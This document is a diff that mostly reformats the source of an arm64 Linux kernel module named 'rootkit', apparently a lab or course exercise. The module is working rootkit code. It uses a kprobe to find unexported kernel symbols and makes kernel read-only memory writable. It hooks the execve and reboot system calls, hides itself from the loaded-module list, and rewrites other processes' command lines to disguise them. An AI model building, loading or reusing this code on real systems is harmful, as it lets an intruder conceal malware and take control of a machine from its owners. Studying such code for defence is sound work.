@@ -26,41 +26,47 @@ struct cdev *kernel_cdev;
 long is_hide;
 
 struct list_head *modules_;
-int (*access_remote_vm_)(struct mm_struct *, unsigned long,
-		void *, int, unsigned int);
-void (*update_mapping_prot_)(phys_addr_t, unsigned long, phys_addr_t, pgprot_t);
+int (*access_remote_vm_)(struct mm_struct *mm, unsigned long addr,
+			void *buf, int len, unsigned int gup_flags);
+void (*update_mapping_prot_)(phys_addr_t phys, unsigned long virt,
+			phys_addr_t size, pgprot_t prot);
 syscall_fn_t *sys_call_table_;
-long (*__arm64_sys_execve_)(const struct pt_regs *);
-long (*__arm64_sys_reboot_)(const struct pt_regs *);
+long (*__arm64_sys_execve_)(const struct pt_regs *regs);
+long (*__arm64_sys_reboot_)(const struct pt_regs *regs);
 unsigned long __start_rodata_, __end_rodata_;
 
 static int rootkit_open(struct inode *inode, struct file *filp)
 {
-
 	printk(KERN_INFO "%s\n", __func__);
 	return 0;
 }
 
-static int rootkit_release(struct inode *inode, struct file *filp) {
-	printk (KERN_INFO "%s\n", __func__);
+static int rootkit_release(struct inode *inode, struct file *filp)
+{
+	printk(KERN_INFO "%s\n", __func__);
 	return 0;
 }
 
-long hook_execve (const struct pt_regs* regs) {
-    char path[PATH_MAX];
-    if (copy_from_user(path, regs->regs[0], PATH_MAX))
-        printk (KERN_INFO "copy_from_user fail.\n");
-	printk (KERN_INFO "exec %s\n", path);
-    return __arm64_sys_execve_(regs);
+long hook_execve(const struct pt_regs *regs)
+{
+	char path[PATH_MAX];
+
+	if (copy_from_user(path, regs->regs[0], PATH_MAX))
+		printk(KERN_INFO "copy_from_user fail.\n");
+	printk(KERN_INFO "exec %s\n", path);
+	return __arm64_sys_execve_(regs);
 }
 
-long hook_reboot (const struct pt_regs* regs) {
-    return EFAULT;
+long hook_reboot(const struct pt_regs *regs)
+{
+	return EFAULT;
 }
 
 // Check get_mm_cmdline
-static int access_mm_name(struct mm_struct* mm, char* name, int len, unsigned int gup_flags) {
-    unsigned long arg_start, arg_end;
+static int access_mm_name(struct mm_struct *mm, char *name, int len,
+						unsigned int gup_flags)
+{
+	unsigned long arg_start, arg_end;
 
 	if (!mm->env_end)
 		return 0;
@@ -73,127 +79,137 @@ static int access_mm_name(struct mm_struct* mm, char* name, int len, unsigned in
 	if (arg_start >= arg_end)
 		return 0;
 
-    return access_remote_vm_(mm, arg_start, name, len, gup_flags);
+	return access_remote_vm_(mm, arg_start, name, len, gup_flags);
 }
 
-static void rename_process(long len, struct masq_proc *masq) {
-    long i, j;
-    struct task_struct *p;
-    struct mm_struct *mm;
-    char task_name[MASQ_LEN];
+static void rename_process(long len, struct masq_proc *masq)
+{
+	long i, j;
+	struct task_struct *p;
+	struct mm_struct *mm;
+	char task_name[MASQ_LEN];
 
-    for (i = 0; i < len; ++i) {
-        if (strlen(masq[i].new_name) > strlen(masq[i].orig_name))
-            masq[i].orig_name[0] = 0;
-        for (j = strlen(masq[i].new_name); j < strlen(masq[i].orig_name); ++j)
-            masq[i].new_name[j] = 0;
-    }
-    for_each_process(p) {
-        mm = p->mm;
-        if (!mm)
-            continue;
-        access_mm_name(mm, task_name, MASQ_LEN, FOLL_GET);
-        task_name[MASQ_LEN - 1] = 0;
-        // printk (KERN_INFO "| %s\n", task_name);
+	for (i = 0; i < len; ++i) {
+		if (strlen(masq[i].new_name) > strlen(masq[i].orig_name))
+			masq[i].orig_name[0] = 0;
+		for (j = strlen(masq[i].new_name);
+			j < strlen(masq[i].orig_name); ++j)
+			masq[i].new_name[j] = 0;
+	}
+	for_each_process(p) {
+		mm = p->mm;
+		if (!mm)
+			continue;
+		access_mm_name(mm, task_name, MASQ_LEN, FOLL_GET);
+		task_name[MASQ_LEN - 1] = 0;
+		// printk(KERN_INFO "| %s\n", task_name);
 
-        for (i = 0; i < len; ++i) {
-            if (!masq[i].orig_name[0])
-                continue;
-            if (!strcmp(task_name, masq[i].orig_name)) {
-                access_mm_name(mm, masq[i].new_name, strlen(masq[i].orig_name), FOLL_WRITE);
-                // printk (KERN_INFO "%s >> %s\n", masq[i].orig_name, masq[i].new_name);
-                break;
-            }
-        }
-        // mmput(mm);
-    }
+		for (i = 0; i < len; ++i) {
+			if (!masq[i].orig_name[0])
+				continue;
+			if (!strcmp(task_name, masq[i].orig_name)) {
+				access_mm_name(mm, masq[i].new_name,
+				strlen(masq[i].orig_name), FOLL_WRITE);
+				// printk(KERN_INFO "%s >> %s\n", masq[i].orig_name, masq[i].new_name);
+				break;
+			}
+		}
+		// mmput(mm);
+	}
 }
 
 static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 		unsigned long arg)
 {
-    long ret = 0;
-    struct masq_proc_req masq_req;
-    struct masq_proc *masq;
-    switch(ioctl) {
-        case IOCTL_MOD_HOOK:
-            sys_call_table_[__NR_execve] = hook_execve;
-            sys_call_table_[__NR_reboot] = hook_reboot;
-            break;
-        case IOCTL_MOD_HIDE:
-            if (is_hide) {
-                list_add_rcu(&(THIS_MODULE->list), modules_);
-                is_hide = 0;
-            }
-            else {
-                list_del_rcu(&(THIS_MODULE->list));
-                is_hide = 1;
-            }
-            break;
-        case IOCTL_MOD_MASQ:
-            masq_req.list = NULL;
-            if (copy_from_user(&masq_req, (struct masq_proc_req __user*) arg,
-                               sizeof(struct masq_proc_req))) {
-                printk (KERN_INFO "First copy_from_user fail.\n");
-                ret = -EINVAL;
-                break;
-            }
-            // printk (KERN_INFO "%ld %px\n", masq_req.len, masq_req.list);
-            masq = (struct masq_proc*)kmalloc(sizeof(struct masq_proc) * masq_req.len, GFP_KERNEL);
-            if (masq == NULL) {
-                printk (KERN_INFO "kmalloc fail.\n");
-                ret = -EINVAL;
-                break;
-            }
-            if (copy_from_user(masq, (struct masq_proc __user*) masq_req.list,
-                               sizeof(struct masq_proc) * masq_req.len)) {
-                printk (KERN_INFO "Second copy_from_user fail.\n");
-                ret = -EINVAL;
-                break;
-            }
-            rename_process(masq_req.len, masq);
-            kfree(masq);
-            break;
-        default:
-            ret = -EINVAL;
-    }
+	long ret = 0;
+	struct masq_proc_req masq_req;
+	struct masq_proc *masq;
 
-	printk (KERN_INFO "%s\n", __func__);
+	switch (ioctl) {
+	case IOCTL_MOD_HOOK:
+		sys_call_table_[__NR_execve] = hook_execve;
+		sys_call_table_[__NR_reboot] = hook_reboot;
+		break;
+	case IOCTL_MOD_HIDE:
+		if (is_hide) {
+			list_add_rcu(&(THIS_MODULE->list), modules_);
+			is_hide = 0;
+		} else {
+			list_del_rcu(&(THIS_MODULE->list));
+			is_hide = 1;
+		}
+		break;
+	case IOCTL_MOD_MASQ:
+		masq_req.list = NULL;
+		if (copy_from_user(&masq_req,
+				 (struct masq_proc_req __user *) arg,
+				 sizeof(struct masq_proc_req))) {
+			printk(KERN_INFO "First copy_from_user fail.\n");
+			ret = -EINVAL;
+			break;
+		}
+		// printk(KERN_INFO "%ld %px\n", masq_req.len, masq_req.list);
+		masq = kmalloc(sizeof(struct masq_proc) * masq_req.len,
+			GFP_KERNEL);
+		if (masq == NULL) {
+			printk(KERN_INFO "kmalloc fail.\n");
+			ret = -EINVAL;
+			break;
+		}
+		if (copy_from_user(masq,
+			(struct masq_proc __user *) masq_req.list,
+			sizeof(struct masq_proc) * masq_req.len)) {
+			printk(KERN_INFO "Second copy_from_user fail.\n");
+			ret = -EINVAL;
+			break;
+		}
+		rename_process(masq_req.len, masq);
+		kfree(masq);
+		break;
+	default:
+		ret = -EINVAL;
+	}
+
+	printk(KERN_INFO "%s\n", __func__);
 	return ret;
 }
 
 struct file_operations fops = {
-	open:		rootkit_open,
-	unlocked_ioctl:	rootkit_ioctl,
-	release:	rootkit_release,
-	owner:		THIS_MODULE
+	open: rootkit_open,
+	unlocked_ioctl : rootkit_ioctl,
+	release : rootkit_release,
+	owner : THIS_MODULE
 };
 
-static void ksym_lookup(void) {
-    // Lookup necessary functions
-    static struct kprobe kp = {
-        .symbol_name = "kallsyms_lookup_name"};
-    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-    kallsyms_lookup_name_t kallsyms_lookup_name;
+static void ksym_lookup(void)
+{
+	// Lookup necessary functions
+	static struct kprobe kp = {
+		.symbol_name = "kallsyms_lookup_name"};
+	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+	kallsyms_lookup_name_t kallsyms_lookup_name;
 
-    register_kprobe(&kp);
-    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
-    unregister_kprobe(&kp);
+	register_kprobe(&kp);
+	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+	unregister_kprobe(&kp);
 
-    modules_             = (void *)kallsyms_lookup_name("modules");
-    access_remote_vm_    = (void *)kallsyms_lookup_name("access_remote_vm");
-    update_mapping_prot_ = (void *)kallsyms_lookup_name("update_mapping_prot");
-    sys_call_table_      = (void *)kallsyms_lookup_name("sys_call_table");
-    __arm64_sys_execve_ = (void *)kallsyms_lookup_name("__arm64_sys_execve");
-    __arm64_sys_reboot_ = (void *)kallsyms_lookup_name("__arm64_sys_reboot");
-    __start_rodata_ = (void *)kallsyms_lookup_name("__start_rodata");
-    __end_rodata_   = (void *)kallsyms_lookup_name("__end_rodata");
-    
-    printk (KERN_INFO "%px\n", modules_);
-    printk (KERN_INFO "%px\n", sys_call_table_);
-    printk (KERN_INFO "%px %px\n", sys_call_table_[__NR_execve], __arm64_sys_execve_);
-    printk (KERN_INFO "%px %px\n", sys_call_table_[__NR_reboot], __arm64_sys_reboot_);
-    printk (KERN_INFO "%px %px\n", __start_rodata_, __end_rodata_);
+	modules_ = (void *)kallsyms_lookup_name("modules");
+	access_remote_vm_ = (void *)kallsyms_lookup_name("access_remote_vm");
+	update_mapping_prot_ =
+		(void *)kallsyms_lookup_name("update_mapping_prot");
+	sys_call_table_ = (void *)kallsyms_lookup_name("sys_call_table");
+	__arm64_sys_execve_ =
+		(void *)kallsyms_lookup_name("__arm64_sys_execve");
+	__arm64_sys_reboot_ =
+		(void *)kallsyms_lookup_name("__arm64_sys_reboot");
+	__start_rodata_ = (void *)kallsyms_lookup_name("__start_rodata");
+	__end_rodata_ = (void *)kallsyms_lookup_name("__end_rodata");
+
+	printk(KERN_INFO "%px\n", modules_);
+	printk(KERN_INFO "%px\n", sys_call_table_);
+	printk(KERN_INFO "%px %px\n", sys_call_table_[__NR_execve], __arm64_sys_execve_);
+	printk(KERN_INFO "%px %px\n", sys_call_table_[__NR_reboot], __arm64_sys_reboot_);
+	printk(KERN_INFO "%px %px\n", __start_rodata_, __end_rodata_);
 }
 
 static int __init rootkit_init(void)
@@ -205,33 +221,33 @@ static int __init rootkit_init(void)
 	kernel_cdev->ops = &fops;
 	kernel_cdev->owner = THIS_MODULE;
 
-	ret = alloc_chrdev_region(&dev_no , 0, 1, "rootkit");
+	ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
 	if (ret < 0) {
 		pr_info("major number allocation failed\n");
 		return ret;
 	}
 
 	major = MAJOR(dev_no);
-	dev = MKDEV(major,0);
-	printk("The major number for your device is %d\n", major);
-	ret = cdev_add( kernel_cdev,dev,1);
-	if(ret < 0 )
-	{
-		pr_info(KERN_INFO "unable to allocate cdev");
+	dev = MKDEV(major, 0);
+	printk(KERN_INFO "The major number for your device is %d\n", major);
+	ret = cdev_add(kernel_cdev, dev, 1);
+	if (ret < 0) {
+		pr_info("unable to allocate cdev");
 		return ret;
 	}
 
-    ksym_lookup();
+	ksym_lookup();
 
-    update_mapping_prot_(__pa_symbol(__start_rodata_), __start_rodata_, __end_rodata_ - __start_rodata_, PAGE_KERNEL);
+	update_mapping_prot_(__pa_symbol(__start_rodata_), __start_rodata_,
+				__end_rodata_ - __start_rodata_, PAGE_KERNEL);
 
 	return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
-    sys_call_table_[__NR_execve] = __arm64_sys_execve_;
-    sys_call_table_[__NR_reboot] = __arm64_sys_reboot_;
+	sys_call_table_[__NR_execve] = __arm64_sys_execve_;
+	sys_call_table_[__NR_reboot] = __arm64_sys_reboot_;
 	// TODO: restore .rodata protect?
 
 	pr_info("%s: removed\n", OURMODNAME);
